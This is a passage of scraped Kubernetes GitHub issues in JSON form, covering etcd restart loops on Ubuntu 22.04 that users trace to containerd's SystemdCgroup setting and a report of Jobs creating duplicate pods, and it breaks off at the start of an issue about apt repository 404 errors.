kubelet[483]: I0526 17:36:46.002909     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasNoDiskPressure\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.003163     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientPID\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.003424     483 eviction_manager.go:254] \"Eviction manager: failed to get summary stats\" err=\"failed to get node info: node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.004224     483 kuberuntime_container.go:722] \"Killing container with a grace period\" pod=\"kube-system/etcd-master0\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e containerName=\"etcd\" containerID=\"containerd://93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\" gracePeriod=30\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.043243     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.143849     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.244834     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.320749     483 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.345973     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.446711     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.547463     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.648269     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.749076     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.810584     483 csi_plugin.go:1063] Failed to contact API server when waiting for CSINode publishing: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csinodes/master0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.850061     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936354     483 generic.go:296] \"Generic (PLEG): container finished\" podID=3da0b3b3f5b168e56c71dd2c6212a28e containerID=\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\" exitCode=0\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936438     483 kubelet.go:2098] \"SyncLoop (PLEG): event for pod\" pod=\"kube-system/etcd-master0\" event=&{ID:3da0b3b3f5b168e56c71dd2c6212a28e Type:ContainerDied Data:93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591}\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936485     483 kubelet.go:2098] \"SyncLoop (PLEG): event for pod\" pod=\"kube-system/etcd-master0\" event=&{ID:3da0b3b3f5b168e56c71dd2c6212a28e Type:ContainerDied Data:a6b4d0f34f4860749e9213893878900a1af4bebd06705a424a831660e6bfd94a}\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936513     483 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"a6b4d0f34f4860749e9213893878900a1af4bebd06705a424a831660e6bfd94a\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936564     483 scope.go:110] \"RemoveContainer\" containerID=\"b1bafb0b8208aedda8d8720c7db6bee631326ae478c37f82f0f0b39b0f2e7746\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.936919     483 kubelet_node_status.go:352] \"Setting node annotation to enable volume controller attach/detach\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.938462     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientMemory\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.938545     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasNoDiskPressure\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.938566     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientPID\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.938897     483 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/etcd-master0\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.939290     483 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 26 17:36:46 master0 kubelet[483]: E0526 17:36:46.950842     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\n```\r\n</details>\r\n\r\nSo kubelet seems to decide to kill the etcd pod, but I don't know why:\r\n```\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.004224     483 kuberuntime_container.go:722] \"Killing container with a grace period\" pod=\"kube-system/etcd-master0\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e containerName=\"etcd\" containerID=\"containerd://93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\" gracePeriod=30\r\n```\r\n\r\nI attached the full `containerd` and `kubelet` logs:\r\n[full_kubelet_logs.txt](https://github.com/kubernetes/kubernetes/files/8781269/full_kubelet_logs.txt)\r\n[full_containerd_logs.txt](https://github.com/kubernetes/kubernetes/files/8781273/full_containerd_logs.txt)"}, {"author": "vsxen", "body": "same question in Fedora \r\nhttps://github.com/containerd/containerd/issues/6704"}, {"author": "Congelli501", "body": "I tried to create a pod with `crictl` manually, and it stayed up:\r\n\r\npod-config.json\r\n``` json\r\n{\r\n    \"metadata\": {\r\n        \"name\": \"busybox\",\r\n        \"namespace\": \"default\",\r\n        \"attempt\": 1\r\n    },\r\n    \"log_directory\": \"/tmp\",\r\n    \"linux\": {\r\n      \"security_context\": {\"namespace_options\": {\"network\": 2}}\r\n    }\r\n}\r\n```\r\n\r\ncontainer-config.json\r\n``` json\r\n{\r\n  \"metadata\": {\r\n      \"name\": \"busybox\"\r\n  },\r\n  \"image\":{\r\n      \"image\": \"busybox\"\r\n  },\r\n  \"command\": [\r\n      \"top\"\r\n  ],\r\n  \"log_path\":\"busybox.0.log\",\r\n  \"linux\": {\r\n  }\r\n}\r\n```\r\n\r\n``` bash\r\ncrictl -r unix:///run/containerd/containerd.sock run container-config.json pod-config.json\r\n```\r\n\r\n```\r\nCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID\r\n2a5c235a70220       aebe758cef4cd       6 minutes ago       Exited              etcd                1059                2586cdecbc207\r\n34b48303aaab1       busybox             7 minutes ago       Running             busybox             0                   add650e8059e4\r\n```"}, {"author": "Congelli501", "body": "Stopping `kubelet` on the machine will prevent further restart of etcd, so `containerd` on its own doesn't restart the pod.\r\n\r\n```\r\nroot@master0:~# systemctl stop kubelet\r\n\r\nroot@master0:~# crictl -r unix:///run/containerd/containerd.sock ps -a\r\nCONTAINER           IMAGE               CREATED              STATE               NAME                ATTEMPT             POD ID\r\nfef6b1e164527       aebe758cef4cd       About a minute ago   Running             etcd                1060                fc02addc9a093\r\n34b48303aaab1       busybox             9 minutes ago        Running             busybox             0                   add650e8059e4\r\n```\r\n\r\n```\r\nroot@master0:~# crictl -r unix:///run/containerd/containerd.sock ps -a\r\nCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID\r\nfef6b1e164527       aebe758cef4cd       29 minutes ago      Running             etcd                1060                fc02addc9a093\r\n34b48303aaab1       busybox             37 minutes ago      Running             busybox             0                   add650e8059e4\r\n```"}, {"author": "vsxen", "body": "https://twitter.com/ctrahey/status/1530386324749950976\r\nping @medyagh "}, {"author": "htech7x", "body": "Have the same issue.\r\nIs there a solution at the moment ?"}, {"author": "dcbw", "body": "From the logs, kubelet seems to think there are two containers in the etcd pod:\r\n\r\n```\r\nMay 26 17:05:17 master0 kubelet[483]: I0526 17:05:17.009874     483 kubelet.go:2098] \"SyncLoop (PLEG): event for pod\" pod=\"kube-system/etcd-master0\" event=&{ID:3da0b3b3f5b168e56c71dd2c6212a28e Type:ContainerStarted Data:16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1}\r\nMay 26 17:05:17 master0 kubelet[483]: I0526 17:05:17.009925     483 kubelet.go:2098] \"SyncLoop (PLEG): event for pod\" pod=\"kube-system/etcd-master0\" event=&{ID:3da0b3b3f5b168e56c71dd2c6212a28e Type:ContainerStarted Data:7fcce86b2abf8d029abe5322624280211ccdc8257c6fb3cdb7ae1ba3f535b31d}\r\n```\r\n\r\nBut containerd thinks there's only one:\r\n\r\n```\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.455252775Z\" level=info msg=\"RunPodsandbox for &PodSandboxMetadata{Name:etcd-master0,Uid:3da0b3b3f5b168e56c71dd2c6212a28e,Namespace:kube-system,A\r\nttempt:845,}\"\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.499404103Z\" level=info msg=\"starting signal loop\" namespace=k8s.io path=/run/containerd/io.containerd.runtime.v2.task/k8s.io/7fcce86b2abf8d029ab\r\ne5322624280211ccdc8257c6fb3cdb7ae1ba3f535b31d pid=574\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.581129864Z\" level=info msg=\"RunPodSandbox for &PodSandboxMetadata{Name:etcd-master0,Uid:3da0b3b3f5b168e56c71dd2c6212a28e,Namespace:kube-system,A\r\nttempt:845,} returns sandbox id \\\"7fcce86b2abf8d029abe5322624280211ccdc8257c6fb3cdb7ae1ba3f535b31d\\\"\"\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.589599770Z\" level=info msg=\"CreateContainer within sandbox \\\"7fcce86b2abf8d029abe5322624280211ccdc8257c6fb3cdb7ae1ba3f535b31d\\\" for container &C\r\nontainerMetadata{Name:etcd,Attempt:842,}\"\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.636894203Z\" level=info msg=\"CreateContainer within sandbox \\\"7fcce86b2abf8d029abe5322624280211ccdc8257c6fb3cdb7ae1ba3f535b31d\\\" for &ContainerMetadata{Name:etcd,Attempt:842,} returns container id \\\"16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\\\"\"\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.637804180Z\" level=info msg=\"StartContainer for \\\"16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\\\"\"\r\nMay 26 17:05:16 master0 containerd[402]: time=\"2022-05-26T17:05:16.705326261Z\" level=info msg=\"StartContainer for \\\"16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\\\" returns successfully\"\r\nMay 26 17:05:17 master0 containerd[402]: time=\"2022-05-26T17:05:17.012040611Z\" level=info msg=\"StopContainer for \\\"16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\\\" with timeout 30 (s)\"\r\nMay 26 17:05:17 master0 containerd[402]: time=\"2022-05-26T17:05:17.012363507Z\" level=info msg=\"Stop container \\\"16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\\\" with signal terminated\"\r\n```\r\n\r\ncould be an issue, but maybe I forget how containerd works. Seems odd though.\r\n\r\nBut really, we need more logging from kubelet to figure out why this happens:\r\n\r\n```\r\nMay 26 17:05:17 master0 kubelet[483]: I0526 17:05:17.011799     483 kuberuntime_container.go:722] \"Killing container with a grace period\" pod=\"kube-system/etcd-master0\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e containerName=\"etcd\" containerID=\"containerd://16f475cf6fd166345aacaa921ac44adb9a31079fe40d2cfed787393012bc01b1\" gracePeriod=30\r\n```\r\n\r\nAny chance you can bump kubelet logging to V=5?"}, {"author": "elfadel", "body": "+1\r\nHaving the same issue on Ubuntu 22.04.\r\n\r\n~ Update\r\nAnd also confirm that the issue does not appear on Ubuntu 20.04. I keep the same k8s installation process in both Ubuntu versions."}, {"author": "fabi200123", "body": "**Found the solution:**\r\nThe problem with this is that if you install containerd by using `sudo apt install containerd` you will install the version v1.5.9 by default which has the option of `SystemdCgroup = false` (which worked for Ubuntu 20.04 but it does not work for Ubuntu 22.04). \r\nThe solution for this problem is either of those: \r\n- you install containerd v1.6.2 which has the `SystemdCgroup = true`\r\n(there is a tutorial here: https://www.itzgeek.com/how-tos/linux/ubuntu-how-tos/install-containerd-on-ubuntu-22-04.html )\r\n- or you change the config file of containerd v1.5.9 so it has this option set to true\r\nIn the config file of containerd v1.5.9 you will find something like this:\r\n```\r\n[plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc.options]\r\n            BinaryName = \"\"\r\n            CriuImagePath = \"\"\r\n            CriuPath = \"\"\r\n            CriuWorkPath = \"\"\r\n            IoGid = 0\r\n            IoUid = 0\r\n            NoNewKeyring = false\r\n            NoPivotRoot = false\r\n            Root = \"\"\r\n            ShimCgroup = \"\"\r\n            SystemdCgroup = false\r\n```\r\nyou need to change it to be like this\r\n```\r\n[plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc.options]\r\n            BinaryName = \"\"\r\n            CriuImagePath = \"\"\r\n            CriuPath = \"\"\r\n            CriuWorkPath = \"\"\r\n            IoGid = 0\r\n            IoUid = 0\r\n            NoNewKeyring = false\r\n            NoPivotRoot = false\r\n            Root = \"\"\r\n            ShimCgroup = \"\"\r\n            SystemdCgroup = true\r\n```\r\n\r\nIn case you can`t find the config for it, just create the file:\r\n\r\n```\r\nsudo mkdir /etc/containerd\r\nnano /etc/containerd/config.toml\r\n```\r\n\r\nand paste the content of the file attached here.\r\n[correct_config.txt](https://github.com/kubernetes/kubernetes/files/8948623/correct_config.txt)\r\nand then restart the containerd:\r\n`systemctl restart containerd`\r\n"}, {"author": "JavadHosseini", "body": "I have containerd version 1.6.6 and I still have this issue on Ubuntu 22.04."}, {"author": "sahil-kcx", "body": "Same issue for me when using Ubuntu 22.04 and containerd version is 1.6.6"}, {"author": "mpartel", "body": "Same on Debian 11 with containerd 1.6.6.\r\n[Starting with the default containerd config](https://github.com/containerd/containerd/issues/6964#issuecomment-1132580240) with `containerd config default > /etc/containerd/config.toml` and editing `SystemdCgroup` to `true` seems to have fixed it."}, {"author": "Congelli501", "body": "Is it possible to add a kubeadm check for this case, and even make kubelet fail on startup with an explicit log ?\r\n\r\nI suppose I'm not the best at diagnosing those kind of problem, but adding those checks would save days of debugging for other people / prevent people from giving up a kubernetes cluster setup."}, {"author": "EricoCartmanez", "body": "You have to tweak containerd as shown [here](https://stackoverflow.com/a/73743910/8679627) \r\n\r\n```\r\nsudo mkdir -p /etc/containerd/\r\n\r\ncontainerd config default | sudo tee /etc/containerd/config.toml\r\n\r\nsudo sed -i 's/SystemdCgroup \\= false/SystemdCgroup \\= true/g' /etc/containerd/config.toml\r\n```\r\n\r\nThen reboot the server "}, {"author": "Um4r-Arafath", "body": "its 2023 December and i still had this issue on my Ubuntu 22.04 and I think I solved it after 3 days of troubleshooting\r\nI noticed something like this when setting `kubeadm init`\r\n\r\n`detected that the sandbox image \"registry.k8s.io/pause:3.6\" of the container runtime is inconsistent with that used by kubeadm. It is recommended that using \"registry.k8s.io/pause:3.9\" as the CRI sandbox image.`\r\n\r\nso I set contained to default config using\r\n\r\n`containerd config default | sudo tee /etc/containerd/config.toml`\r\n\r\nand updated and set `SystemdCgroup = true` & `sandbox_image = \"registry.k8s.io/pause:3.9\"`\r\n\r\nAfter rebooting the server, everything should be up and running perfectly fine."}, {"author": "d123456temp", "body": "It's devastating that it is 2024.02.04 and I got hit by the same issue. 22.04 is pretty popular... Lost 3 days pulling my hairs out. The Kubernetes project is in a strange shape these days - was a heavy on premises user from early releases but starting to look for alternatives, this doesn't look like safe and stable choice any more.\r\n\r\nFellow users, thank you for investigating this.\r\n\r\nThis was not that straightforward to google up, so adding keyword phrases for future victims:\r\n- kubernetes k8s cluster stops responding to api calls several minutes after cluster bootstrap\r\n- The connection to the server :6443 was refused - did you specify the right host or port?\r\n- 22.04 kubernetes cannot connect to kubernetes api\r\n- jammy cannot connect to kubernetes api\r\n- kube-system pods keep restarting after cluster bootstrap\r\n- kube-apiserver stops responding after cluster bootstrap\r\n"}, {"author": "fuch1m", "body": "Came also accross this. The `SystemdCgroup` was not present at all after running `containerd config default | sudo tee /etc/containerd/config.toml`. But after I inserted `SystemdCgroup = true` it was running and pods didn't crash anymore."}, {"author": "henriqueccapozzi", "body": "@Um4r-Arafath\nThank you very much for this solution \ud83d\ude4f "}, {"author": "mikersays", "body": "I wasted almost my entire weekend trying to troubleshoot this, but my deepest gratitude to @Um4r-Arafath for the excellent solution!"}, {"author": "asdfsx", "body": "@Um4r-Arafath @fabi200123\nIt works for me!\nThank you all very much!"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 130683, "issue_url": "https://github.com/kubernetes/kubernetes/issues/130683", "issue_title": "Job with no parellelism randomly creates 2 duplicate Pods instead of 1", "issue_author": "istepaniuk", "issue_body": "### What happened?\n\nA Job is created with completions: 1,  parallelism: 1. However, two pods appear a few minutes apart, both with identical `ownerReferences` (name, uid, etc. all point to the same unique Job).\n\nI don't understand what I see in the `kube-controller-manager` logs, when the first pod is scheduled, I see\n```\nI0305 18:28:46.167341       1 job_controller.go:566] \"enqueueing job\" logger=\"job-controller\" key=\"the-namesapce/the-job-name-1741199325\"\n```\n\nThat same \"enqueueing job\" log  line repeats 9 times, most in the same second, some a bit later:\n```\nI0305 18:28:46.167341 ...\nI0305 18:28:46.183597 ...\nI0305 18:28:46.192648 ...\nI0305 18:28:46.195377 ...\nI0305 18:28:46.233094 ...\nI0305 18:28:48.915103 ...\nI0305 18:29:24.315840 ...\nI0305 18:29:25.328100 ...\nI0305 18:29:26.339424 ...\n```\n\nAt few minutes later, with the first pod is already running, a second one appears. At this exact time the logs show a similar message:\n```\nI0305 18:31:46.236414       1 job_controller.go:566] \"enqueueing job\" logger=\"job-controller\" key=\"the-namesapce/the-job-name-1741199325\"\nI0305 18:31:47.613379       1 job_controller.go:566] \"enqueueing job\" logger=\"job-controller\" key=\"the-namesapce/the-job-name-1741199325\"\nE0305 18:31:50.044308       1 job_controller.go:599] syncing job: tracking status: adding uncounted pods to status: Operation cannot be fulfilled on jobs.batch \"the-job-name-1741199325\": the object has been modified; please apply your changes to the latest version and try again\n...\nI0305 18:31:51.068789       1 job_controller.go:566] \"enqueueing job\" logger=\"job-controller\" .... (repeats again 7 times rapidly)\n```\n\nThe only clue I have is this \"the object has been modified\", but certainly does not make any sense to me. The Job object has been created with a single \"kubectl create -f job.yaml\", nothing fancy in it. What could be going on? \n\n### What did you expect to happen?\n\nOnly one Pod should be scheduled.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nUnfortunately, this seems to happen randomly (once in hundreds of Jobs). I need help understanding what causes this, if I do, I can try to reproduce it.\n\n### Anything else we need to know?\n\nSomething similar seems to have been reported for a very old version #120790, but it's difficult to understand if it's the same.\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.30.4\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.30.4\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nOn-prem 20 node cluster deployed with Kubespray.\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n$ cat /etc/os-release\nPRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nVERSION=\"12 (bookworm)\"\nVERSION_CODENAME=bookworm\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n\n$ uname -a\nLinux [redacted host name] 6.1.0-28-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64 GNU/Linux\n\n```\n\n</details>\n\n\n### Install tools\n\n<details>\nKubespray\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "kind/support", "sig/apps", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "Ritikaa96", "body": "/sig apps"}, {"author": "Ritikaa96", "body": "/kind support\nfor now i think this is more of  support issue."}, {"author": "Ritikaa96", "body": "can you share the controller logs and check if the api server is not suffering from resource contention. sometimes such condition cause these issues."}, {"author": "Ritikaa96", "body": "there is one more old discussion related to this issue: https://github.com/kubernetes/kubernetes/issues/62772 \nPTAL"}, {"author": "Ritikaa96", "body": "this is also mentioned in the docs [here](https://kubernetes.io/docs/concepts/workloads/controllers/job/#handling-pod-and-container-failures)\n\n> Note that even if you specify .spec.parallelism = 1 and .spec.completions = 1 and .spec.template.spec.restartPolicy = \"Never\", the same program may sometimes be started twice.\n\n> If you do specify .spec.parallelism and .spec.completions both greater than 1, then there may be multiple pods running at once. Therefore, your pods must also be tolerant of concurrency."}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "Blinkuu", "body": "We ran into the same issue. The Job spawned another pod **after the previous pod completed** even though we set `completions: 1`, `parallelism: 1`, and `restartPolicy: Never`.\n\nHere are some logs:\n```\n1752066494525\t2025-07-09T13:08:14.525Z\tobject_name=job-4999896-vttmw object_kind=Pod type=Warning component=kubelet host=ip-<redacted> reason=FailedCreatePodSandBox message=\"Failed to create pod sandbox: rpc error: code = Unknown desc = failed to setup network for sandbox \\\"95f6d1f615961095747e53cdea35b5dc100b870616392bdefadf2ca677e72977\\\": plugin type=\\\"aws-cni\\\" name=\\\"aws-cni\\\" failed (add): add cmd: failed to assign an IP address to container\"\n1752066494511\t2025-07-09T13:08:14.511Z\t{\"level\":\"error\",\"ts\":\"2025-07-09T13:08:14.511Z\",\"caller\":\"rpc/rpc.pb.go:881\",\"msg\":\"Failed to delete the pod annotation: error while trying to retrieve pod info: Pod \\\"job-4999896-vttmw\\\" not found\"}\n1752066494484\t2025-07-09T13:08:14.484Z\t{\"level\":\"error\",\"ts\":\"2025-07-09T13:08:14.484Z\",\"caller\":\"rpc/rpc.pb.go:863\",\"msg\":\"Failed to add the pod annotation: error while trying to retrieve pod info: Pod \\\"job-4999896-vttmw\\\" not found\"}\n1752066494144\t2025-07-09T13:08:14.144Z\tobject_name=job-4999896-vttmw object_kind=Pod type=Normal component=<no value> reason=Scheduled message=\"Successfully assigned <redacted-ns>/job-4999896-vttmw to ip-<redacted>\"\n1752066474419\t2025-07-09T13:07:54.419Z\tobject_name=job-4999896 object_kind=Job type=Normal component=job-controller reason=SuccessfulCreate message=\"Created pod: job-4999896-vttmw\"\n1752066473420\t2025-07-09T13:07:53.420Z\tobject_name=job-4999896 object_kind=Job type=Normal component=job-controller reason=Completed message=\"Job completed\"\n1752066455841\t2025-07-09T13:07:35.841Z\tobject_name=job-4999896-lst8v object_kind=Pod type=Normal component=<no value> reason=Scheduled message=\"Successfully assigned <redacted-ns>/job-4999896-lst8v to ip-<redacted>\"\n1752066455820\t2025-07-09T13:07:35.820Z\tobject_name=job-4999896 object_kind=Job type=Normal component=job-controller reason=SuccessfulCreate message=\"Created pod: job-4999896-lst8v\"\n1752066455819\t2025-07-09T13:07:35.819Z\tobject_name=job-4999896 object_kind=PodDisruptionBudget type=Normal component=controllermanager reason=NoPods message=\"No matching pods found\"\n```"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/130683#issuecomment-3271334191):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 97264, "issue_url": "https://github.com/kubernetes/kubernetes/issues/97264", "issue_title": "Kubernetes packages.cloud.google.com repo sometimes returns 404", "issue_author": "aporcupine", "issue_body": "**What happened**:\r\n\r\n1. Add `deb https://apt.kubernetes.io/ kubernetes-xenial main` to /etc/apt/sources.list\r\n2. Run an apt update\r\n3. 1/2 of the time an error occurs showing a 404 from `https://packages.cloud.google.com/apt/dists/kubernetes-xenial/main/binary-arm64/by-hash/SHA256/b7b1a18f5c904c827f404ea5d6be989d6132654e6e3854e398c266ed5fe1ad00`\r\n4. Manually completing a curl of this URL results in either a list of packages, or a 404.\r\n\r\n**What you expected to happen**:\r\n\r\nURL not to 404 and apt update to succeed.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\n\r\nKeep making requests to https://packages.cloud.google.com/apt/dists/kubernetes-xenial/main/binary-arm64/by-hash/SHA256/b7b1a18f5c904c827f404ea5d6be989d6132654e6e3854e398c266ed5fe1ad00\r\n\r\n**Anything else we need to know?**:\r\n\r\nI've attached the result of a verbose curl during a successful call and and an un-successful call:\r\n[success.txt](https://github.com/kubernetes/kubernetes/files/5684496/success.txt)\r\n[404.txt](https://github.com/kubernetes/kubernetes/files/5684497/404.txt)\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`): 1.20\r\n- Cloud provider or hardware configuration: Bare Metal Ubuntu arm64\r\n- OS (e.g: `cat /etc/os-release`): \r\n```\r\nPRETTY_NAME=\"Debian GNU/Linux bullseye/sid\"\r\nNAME=\"Debian 